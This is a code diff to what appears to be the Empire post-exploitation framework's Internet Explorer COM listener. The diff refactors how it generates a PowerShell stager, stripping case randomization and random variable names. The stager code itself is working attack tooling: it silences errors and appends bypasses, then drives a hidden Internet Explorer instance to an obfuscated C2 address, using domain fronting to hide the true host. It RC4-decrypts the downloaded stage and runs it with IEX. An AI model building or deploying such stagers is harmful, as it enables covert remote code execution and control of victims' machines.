@@ -327,7 +327,7 @@ class Listener(object):
 
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
-            stagingKey = listenerOptions["StagingKey"]["Value"]
+            staging_key = listenerOptions["StagingKey"]["Value"]
             profile = listenerOptions["DefaultProfile"]["Value"]
             requestHeader = listenerOptions["RequestHeader"]["Value"]
             uris = [a for a in profile.split("|")[0].split(",")]
@@ -339,15 +339,12 @@ class Listener(object):
 
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
                 if safeChecks.lower() == "true":
-                    stager = helpers.randomize_capitalization(
-                        "If($PSVersionTable.PSVersion.Major -ge 3){"
-                    )
+                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+
                     for bypass in bypasses:
                         stager += bypass
                     stager += "};"
-                    stager += helpers.randomize_capitalization(
-                        "[System.Net.ServicePointManager]::Expect100Continue=0;"
-                    )
+                    stager += "[System.Net.ServicePointManager]::Expect100Continue=0;"
 
                 # TODO: reimplement stager retries?
 
@@ -365,27 +362,16 @@ class Listener(object):
                             host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("K")
-                    + "=[System.Text.Encoding]::ASCII.GetBytes("
+                stager += (
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                 )
-                stager += "'%s');" % (stagingKey)
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization(
-                    "$R={$D,$"
-                    + helpers.generate_random_script_var_name("K")
-                    + "=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$"
-                    + helpers.generate_random_script_var_name("K")
-                    + "[$_%$"
-                    + helpers.generate_random_script_var_name("K")
-                    + ".Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
-                )
+                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
-                    stagingKey,
+                    staging_key,
                     sessionID="00000000",
                     language="POWERSHELL",
                     meta="STAGE0",
@@ -395,16 +381,10 @@ class Listener(object):
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += (
-                    "$ser="
-                    + data_util.obfuscate_call_home_address(host)
-                    + ";$t='"
-                    + stage0
-                    + "';"
-                )
+                stager += f"$ser={ data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"
 
                 # add the RC4 packet to a header location
-                stager += '$c="%s: %s' % (requestHeader, b64RoutingPacket)
+                stager += f'$c="{ requestHeader }: { b64RoutingPacket }'
 
                 # Add custom headers if any
                 modifyHost = False
@@ -416,15 +396,13 @@ class Listener(object):
                         if headerKey.lower() == "host":
                             modifyHost = True
 
-                        stager += "`r`n%s: %s" % (headerKey, headerValue)
+                        stager += f"`r`n{ headerKey }: { headerValue }"
 
                 stager += '";'
                 # If host header defined, assume domain fronting is in use and add a call to the base URL first
                 # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                 if modifyHost:
-                    stager += helpers.randomize_capitalization(
-                        "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};"
-                    )
+                    stager += "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};"
 
                 stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
@@ -432,16 +410,10 @@ class Listener(object):
                 stager += (
                     "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
                 )
-                stager += helpers.randomize_capitalization(
-                    "$iv=$data[0..3];$data=$data[4..$data.length];"
-                )
+                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization(
-                    "-join[Char[]](& $R $data ($IV+$"
-                    + helpers.generate_random_script_var_name("K")
-                    + ")) | IEX"
-                )
+                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -546,36 +518,32 @@ class Listener(object):
             if workingHours != "":
                 stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
 
-            randomizedStager = ""
+            unobfuscated_stager = ""
             stagingKey = stagingKey.encode("UTF-8")
 
             for line in stager.split("\n"):
                 line = line.strip()
                 # skip commented line
                 if not line.startswith("#"):
-                    # randomize capitalization of lines without quoted strings
-                    if '"' not in line:
-                        randomizedStager += helpers.randomize_capitalization(line)
-                    else:
-                        randomizedStager += line
+                    unobfuscated_stager += line
 
             if obfuscate:
-                randomizedStager = data_util.obfuscate(
+                unobfuscated_stager = data_util.obfuscate(
                     self.mainMenu.installPath,
-                    randomizedStager,
+                    unobfuscated_stager,
                     obfuscationCommand=obfuscationCommand,
                 )
             # base64 encode the stager and return it
             if encode:
-                return helpers.enc_powershell(randomizedStager)
+                return helpers.enc_powershell(unobfuscated_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, randomizedStager.encode("UTF-8")
+                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
                 )
             else:
                 # otherwise just return the case-randomized stager
-                return randomizedStager
+                return unobfuscated_stager
 
         else:
             print(
